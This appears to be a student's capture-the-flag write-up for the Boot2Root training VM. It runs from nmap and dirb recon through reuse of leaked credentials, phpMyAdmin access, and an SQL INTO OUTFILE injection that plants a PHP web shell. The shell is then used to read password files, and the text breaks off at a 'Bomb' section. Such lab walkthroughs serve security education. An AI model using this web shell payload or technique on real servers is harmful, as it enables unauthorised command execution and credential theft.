# VM set-up

In order to do the challenge, we chose to work with VirtualBox VM. First of all, open VirtualBox and create a network adapter. <br/>
Then, download the VM's disk image from the intranet, create a new VM with the image, and finally connect it to the network under the "private host mode" (using the network adapter created beforehand, here it's `vboxnet0`).
You're set !

# Let's start digging

Of course the VM does not offer its IP address, so let's dig in.

First of all, let's run a simple `ifconfig`, in order to retrieve our `vboxnet0` (our network adapter) address. <br/>
On our network, it should go as follows : <br/>

`$ ifconfig`<br/>
`[...]`<br/>
`vboxnet0: [...]`<br/>
`inet X.X.99.1 netmask 0xffffff00 broadcast X.X.99.255` (X's for privacy only)

We can deduce that the VM's IP approximates this IP, for example : X.X.99.178.

Let's download nmap (here under MacOS) : `brew install nmap`<br/>
Using `nmap`, we'll scan for open ports under a wide range of IPs, like so : `nmap -v X.X.99.1-255` (`-v` for verbosity, `1-255` to scan a range of IPs).

Bingo, we just found a variety of open ports for the following IP addr : `X.X.99.107` (can vary on your machine)<br/>
`Nmap scan report for X.X.99.107`<br/>
`Host is up (0.0024s latency).`<br/>
`Not shown: 994 filtered ports`<br/>
`PORT    STATE SERVICE`<br/>
`21/tcp  open  ftp`<br/>
`22/tcp  open  ssh`<br/>
`80/tcp  open  http`<br/>
`143/tcp open  imap`<br/>
`443/tcp open  https`<br/>
`993/tcp open  imaps`<br/>

We can't access the VM via SSH for now, since we've got no username and password available.

We'll try to dig in the http/https ports, using another tool : `dirb`.<br/>
First, let's download dirb : `brew install sidaf/pentest/dirb`<br/>
`dirb` will help us know all the routes hosted on the http/https server, so we'll have more matter to gain access to the VM.

Head to dirb's installation folder (or create an alias), configure then make the installation (use `chmod 755` if needed).<br/>
Using the wordlists provided, we can investigate like so : `./dirb "https://[VM IP]" wordlists/common.txt` (or use `wordlists/big.txt`).

Bingo again, we find three interesting routes :<br/>
`/forum`<br/>
`/phpmyadmin`<br/>
`/webmail`</br>

# Forum

Let's head to the forum : `https://[VM IP]/forum`<br/>
There's a topic called `"Probleme login ?"` from user `lmezard`. Read it. It contains a log of authentication requests done on the server previously (+ ssh, cronjobs, etc).

Keep scrolling down, and you'll find :<br/>
`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`<br/>
`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]`<br/>
`Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)`

Looks like a clear password, doesn't it ? And apparently, the user `lmezard` managed to log in soon after the authentication failure. Save these informations for later.

We can keep investigating on the forum : there is a Log in page and a Users page (which gives us the names of all forum users).<br/>
Try to log in using the credentials : `lmezard : !q\]Ej?*5K5cy*AJ`<br/>
It works ! On lmezard's account page, we find an e-mail address : `laurie@borntosec.net`

Good, let's find out if we can access the mail server with these informations.

# Webmail

Go to : `https://[VM IP]/webmail`<br/>
When asked, try the combo : `laurie@borntosec.net : !q\]Ej?*5K5cy*AJ`<br/>
Aaaand... it works. Laurie did not pick another password for the mail section, which is a security breach.

Laurie exchanged e-mails with `ft_root@mail.borntosec.net` (if you ding in the `INBOX.Sent` section), and got an answer from `qudevide@mail.borntosec.net` :<br/>
`You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$` (which translates to `root : Fg-'kKXBj87E:aJ$` credentials).

We can learn more on SquirrelMail while lurking around the `/webmail` section. Basically, SquirrelMail is a webmail service which includes built-in pure PHP support for the IMAP and SMTP protocols. It can be set-up on a web server that runs PHP (and an IMAP server).

More here : https://squirrelmail.org/docs/admin/admin-1.html#ss1.1

Here, we can deduce it basically provides a mailing service for all the users on the VM (lmezard, thor, zaz, root...).

Now that we have database credentials, let's dig into it !


# Phpmyadmin

Go to : `https://[VM IP]/phpmyadmin`<br/>
Log in using root credentials : `root : Fg-'kKXBj87E:aJ$`<br/>
We can find a database called `forum_db`. We can find all users passwords under the `mlf2_userdata` table, but it won't help much.

What we can try, though, is to hack into the DB using an SQL injection inside the `forum_db` database. Since it's probably a LAMP server (so with Apache, information we can find while inspecting the network pannel on the forum), we could get direct access to the VM through a shell instance.

After surfing on the web for a while, we learn we can inject shell commands inside the db using a PHP script, like so : `SELECT "<?php system($_GET['cmd']); ?>" into outfile "[FOLDER WHERE THE SERVER IS STORED]/hello.php";`<br/>
Why that works : `system()` PHP function is used to launch shell commands. Here, we'll tell PHP to run any command which is stored in the `hello.php?cmd=something` query, from the URL.

Under LAMP, files from the website are usually stored under `/var/www/` or `/var/www/custom_routes` (which is probably the case here, like `/var/www/forum`).
Simply using the command won't work, we need to find a folder on which we have rights to store the script.

Using `dirb` again, we can find many routes/folders under the `/forum` one. We can inject the script in the following folder : `/forum/templates_c/`<br/>
Correct the SQL injection : `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/hello.php";`

Bingo ! Now we can launch commands from the URL via the `hello.php` script like so : `https://[VM IP]/forum/templates_c/hello.php?cmd=command`

Let's dig : `https://[VM IP]/forum/templates_c/hello.php?cmd=ls%20%20/home` (all space characters are converted using URL encoding conventions, here ` ` is equal to `%20`, etc).<br/>
We find : `LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz`<br/>

Play around (LOOKATME is a folder), then look at the `password` inside the LOOKATME folder file using the `cat` command : `https://[VM IP]/forum/templates_c/hello.php?cmd=cat%20/home/LOOKATME/password`<br/>
We get a login:password couple : `lmezard:G!@M6f4Eatau{sF"`

We can use these credentials to log directly inside the VM.

Sources :<br/>
https://docs.joomla.org/Configuring_a_LAMPP_server_for_PHP_development/Linux_desktop<br/>
https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/<br/>
https://www.php.net/manual/en/function.system.php

# So much fun !

When logged as lmezard (using the previous login:password credentials), we have access to two files : `fun` and `README`.<br/>
The README says to complete the challenge in order to get ssh access as `laurie`.<br/>
The `fun` file is unreadable inside the VM, let's copy it inside our own environment using `ftp` (file transfer protocol). You can download it inside MacOS via homebrew : `brew install inetutils` (you now have access to the `ftp` command).

Download the `fun` file : `ftp [VM IP]` (then pursue as `lmezard`, use the password again), then inside the environment use `get fun` (exit using `bye`).

Read the `fun` file (using VScode, for example).
Keep scrolling and you'll find this section : <br/>
` int main() {`<br/>
`	printf("M");`<br/>
`	printf("Y");`<br/>
`	printf(" ");`<br/>
`	printf("P");`<br/>
`	printf("A");`<br/>
`	printf("S");`<br/>
`	printf("S");`<br/>
`	printf("W");`<br/>
`	printf("O");`<br/>
`	printf("R");`<br/>
`	printf("D");`<br/>
`	printf(" ");`<br/>
`	printf("I");`<br/>
`	printf("S");`<br/>
`	printf(":");`<br/>
`	printf(" ");`<br/>
`	printf("%c",getme1());`<br/>
`	printf("%c",getme2());`<br/>
`	printf("%c",getme3());`<br/>
`	printf("%c",getme4());`<br/>
`	printf("%c",getme5());`<br/>
`	printf("%c",getme6());`<br/>
`	printf("%c",getme7());`<br/>
`	printf("%c",getme8());`<br/>
`	printf("%c",getme9());`<br/>
`	printf("%c",getme10());`<br/>
`	printf("%c",getme11());`<br/>
`	printf("%c",getme12());`<br/>
`	printf("\n");`<br/>
`	printf("Now SHA-256 it and submit");`<br/>
`}`<br/>

So : `MY PASSWORD IS : [the result of all getme() functions] hashed with the SHA-256 algorithm`.<br/>
We only have direct access to the return values of functions `getme8-12()`, which results in `wnage`, we'll need to dig in order to find `getme1-7()`.<br/>
We choose to dig visually, using `CMD+F getme`. We can find all `getmeX()` functions but the return values are simple jokes.

Keep digging around : all `getme1-7()` functions bodies are prefixed with comments structured as `//fileXXX [data] ft_fun/file.pcap [data]`, all wrapped inside curly brackets (`{}`).
Still using `CMD+F getme`, there are always such comments wrapped inside the functions. Also, there are `return 'something'` strings inside the `fun` file.

After thinking and trying many approaches, we can deduce the logic is as follows : if the comment inside a `getmeX()` points to `//file10` for example, we need to look for `//file11`. After reading the content of the line associated with the file, we can almost always be certain there will be a `return 'something'` string upwards.<br/>
For example : `getme7()` points toward `file736`, so we look for `file737`, and at the end of the line, two lines upward, we find `return 'p'`.

To complete the challenge we need to work in descending order : look for `getme7()`, find the `return 'p'`, then look for `getme6()`, find the `return 't'`, and so on...<br/>
This won't work with `getme1()`, which is where we find the trick : if you look for all the returns using `CMD+F`, there is a lone `return 'I'` which falls outside this logic. Since it's a capital 'I', we can deduce it's the start of the password (and so, the return value associated with `getme1()` !).

So, working in descending order and taking in the lone `I` afterwards, we can recreate the password, which gives us : `Iheartpwnage`.<br/>
Sha-256 : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

Use the couple `laurie : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` to log in as laurie with SSH.<br/>
`ssh laurie@VM IP` (then enter the password when asked).

We're in !

# Bomb
